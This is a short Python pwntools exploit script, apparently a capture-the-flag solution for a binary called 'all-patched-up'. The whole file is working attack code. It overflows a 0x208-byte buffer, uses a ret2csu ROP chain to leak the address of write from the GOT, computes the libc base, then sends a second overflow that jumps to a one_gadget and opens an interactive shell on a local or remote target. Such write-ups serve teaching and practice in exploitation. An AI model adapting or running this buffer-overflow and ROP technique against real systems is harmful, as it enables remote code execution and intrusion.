#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./all-patched-up_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

write_got = elf.got["write"]
main_sym = elf.symbols["main"]

rop = ROP(elf)
rop.ret2csu(1, write_got, 8, call=write_got)
payload = b"A" * 0x208
payload += rop.chain()
payload += flat(main_sym)

pause()
io.sendafter(b"> ", payload)

libc_leak = u64(io.recv(8))
log.info(f"{libc_leak=:#x}")

libc.address = libc_leak - libc.symbols["write"]
log.info(f"{libc.address=:#x}")

# r15 == NULL && r12 == NULL
one_gadget = libc.address + 0xe3afe
pop_r12_r13_r14_r15 = 0x0040124c

rop = ROP(elf)
payload = b"A" * 0x208
payload += flat(pop_r12_r13_r14_r15, 0, 0, 0, 0)
payload += flat(one_gadget)

io.sendafter(b"> ", payload)

io.interactive()
